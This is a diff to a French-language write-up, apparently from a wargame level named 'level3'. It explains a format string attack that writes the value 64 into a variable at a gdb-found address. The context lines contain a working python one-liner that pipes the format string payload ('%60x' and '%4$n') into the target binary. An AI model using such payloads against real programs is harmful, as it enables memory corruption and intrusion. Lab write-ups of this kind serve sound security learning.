@@ -41,6 +41,8 @@ $1 = (<data variable, no debug info> *) 0x804988c
 
 Pour que m soit égal à 0x40, on doit stocker le chiffre 64 dedans car 64 = 0x40 en hexadécimal.
 
+Donc l'adresse de M = 4 + %60x (padding)
+
 Maintenant, il ne reste plus qu'à réaliser notre exploit :
 
 (python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")'; cat) | ./level3
